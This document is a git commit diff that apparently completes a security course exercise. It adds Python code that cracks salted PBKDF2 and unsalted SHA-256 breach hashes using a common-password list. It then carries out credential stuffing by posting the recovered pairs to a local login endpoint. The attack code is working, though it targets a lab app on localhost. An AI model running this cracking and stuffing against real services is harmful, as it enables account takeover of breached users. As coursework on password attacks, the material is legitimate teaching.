933faaf40e60a00e22a5ca3271560b29737d8a90
Yiran <yiran_w1123@hotmail.com>
2021-09-13 23:24:09 -0400

    Added code for Exercise 1.1 - 1.3

--- brute.py
+++ brute.py
@@ -1,4 +1,6 @@
 from csv import reader
+from app.util.hash import hash_sha256, hash_pbkdf2
+from stuff import credential_stuffing_attack
 
 COMMON_PASSWORDS_PATH = 'common_passwords.txt'
 SALTED_BREACH_PATH = "app/scripts/breaches/salted_breach.csv"
@@ -13,14 +15,31 @@ def load_breach(fp):
 def load_common_passwords():
     with open(COMMON_PASSWORDS_PATH) as f:
         pws = list(reader(f))
-    return pws
+    out = []
+    for pw in pws:
+        out.append(pw[0])
+
+    return out
 
 def brute_force_attack(target_hash, target_salt):
-    pass
+    passwords = load_common_passwords()
+
+    for pwd in passwords:
+        hashed = hash_pbkdf2(pwd, target_salt)
+        if hashed == target_hash:
+            return pwd
+    return None
 
 def main():
     salted_creds = load_breach(SALTED_BREACH_PATH)
-    brute_force_attack(salted_creds[0][1], salted_creds[0][2])
+    creds = []
+
+    for name, salted_pwd, salt in salted_creds:
+        pwd = brute_force_attack(salted_pwd, salt)
+        if pwd:
+            creds.append([name, pwd])
+    credential_stuffing_attack(creds)
+
 
 if __name__ == "__main__":
     main()
--- stuff.py
+++ stuff.py
@@ -1,9 +1,35 @@
 from csv import reader
 from requests import post, codes
+from app.util.hash import hash_sha256
 
 LOGIN_URL = "http://localhost:8080/login"
 
 PLAINTEXT_BREACH_PATH = "app/scripts/breaches/plaintext_breach.csv"
+
+def load_common_pwd(file):
+    with open(file) as f:
+        r = reader(f, delimiter= ' ')
+        header = next(r)
+        assert(header[0] == 'password')
+        return list(r)
+
+def create_look_up_table(file):
+    passwords = load_common_pwd(file)
+    d = {}
+
+    for pwd in passwords:
+        d[hash_sha256(pwd[0])] = pwd[0]
+    return d
+
+def credential_stuffing_with_hash(creds):
+    table = create_look_up_table('common_passwords.txt')
+    success = []
+    for username, hashed in creds:
+        pwd = table[hashed]
+        if attempt_login(username, pwd) is True:
+            print(username, pwd)
+            success.append(username + ' '+ pwd)
+    return success
 
 def load_breach(fp):
     with open(fp) as f:
@@ -22,11 +48,20 @@ def attempt_login(username, password):
     return response.status_code == codes.ok
 
 def credential_stuffing_attack(creds):
-    pass
+
+    success = []
+    for name, cred in creds:
+        if attempt_login(name, cred) is True:
+            print(name, cred)
+            success.append(name + " "+ cred)
+    return success
 
 def main():
     creds = load_breach(PLAINTEXT_BREACH_PATH)
     credential_stuffing_attack(creds)
+    fileName = 'app/scripts/breaches/hashed_breach.csv'
+    hashed_creds = load_breach(fileName)
+    credential_stuffing_with_hash(hashed_creds)
 
 if __name__ == "__main__":
     main()
